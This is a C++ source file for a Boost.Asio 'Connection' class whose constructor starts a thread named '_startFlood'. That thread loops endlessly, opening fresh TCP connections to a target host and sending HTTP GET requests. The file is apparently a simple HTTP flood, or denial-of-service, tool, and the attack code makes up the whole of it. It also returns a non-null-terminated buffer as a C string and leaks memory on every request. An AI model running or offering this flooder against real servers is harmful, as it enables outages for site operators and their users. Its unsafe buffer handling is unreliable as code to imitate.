#include "Connection.hpp"
#include <functional>

Connection::Connection(const std::string& url) : _url(url), _resolver(_io_context), _socket(_io_context) {
    boost::asio::ip::tcp::resolver::results_type endpoints = _resolver.resolve(_url, "http");
    boost::asio::connect(_socket, endpoints);

    pthread_create(&_thread, NULL, _startFlood, this);
}

Connection::~Connection()
{
    pthread_cancel(_thread);
}

const char* Connection::GetResponce()
{
    try {
        boost::asio::io_service io_service;
        boost::asio::ip::tcp::resolver resolver(io_service);
        boost::asio::ip::tcp::resolver::iterator endpoint_iterator = resolver.resolve({ _url, "http" });
        boost::asio::ip::tcp::socket socket(io_service);
        boost::asio::connect(socket, endpoint_iterator);

        std::string request = "GET / HTTP/1.1\r\n"
            "Host: " + _url + "\r\n"
            "Connection: keep-alive\r\n\r\n";

        boost::asio::write(socket, boost::asio::buffer(request));

        std::vector<char> buffer(1024);
        size_t bytes_transferred = socket.read_some(boost::asio::buffer(buffer));

        char* response = new char[bytes_transferred];
        std::copy(buffer.begin(), buffer.begin() + bytes_transferred, response);

        return response;
    }
    catch (std::exception& e) {
        std::cerr << "Exception: " << e.what() << std::endl;
        return nullptr;
    }
}

void* Connection::_startFlood(void* attr) 
{
    Connection* connection = reinterpret_cast<Connection*>(attr);
    while(1)
    { 
        connection->queue.enqueue(connection->GetResponce());
    }
}